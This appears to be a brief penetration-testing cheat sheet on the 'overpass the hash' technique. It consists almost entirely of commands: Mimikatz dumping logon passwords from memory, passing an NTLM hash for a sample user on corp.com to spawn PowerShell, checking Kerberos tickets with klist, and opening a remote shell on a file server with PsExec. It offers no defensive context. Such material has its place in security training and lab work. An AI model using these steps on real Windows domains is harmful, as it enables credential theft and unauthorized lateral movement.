# Overpass The Hash

Mimikatz

```
privilege::debug
sekurlsa::logonpasswords
```

Need username and NTLM hashes

```
sekurlsa::pth /user:jen /domain:corp.com /ntlm:369def79d8372408bf6e93364cc93075 /run:powershell
```

Use klist to list cached Kerberos tickets

```
klist
```

Try authenticate to any fileshare

```
net use \\files04
```

Check klist again

```
klist
```

We can now use psexec.exe to authenticate

```
.\PsExec.exe \\files04 cmd
```
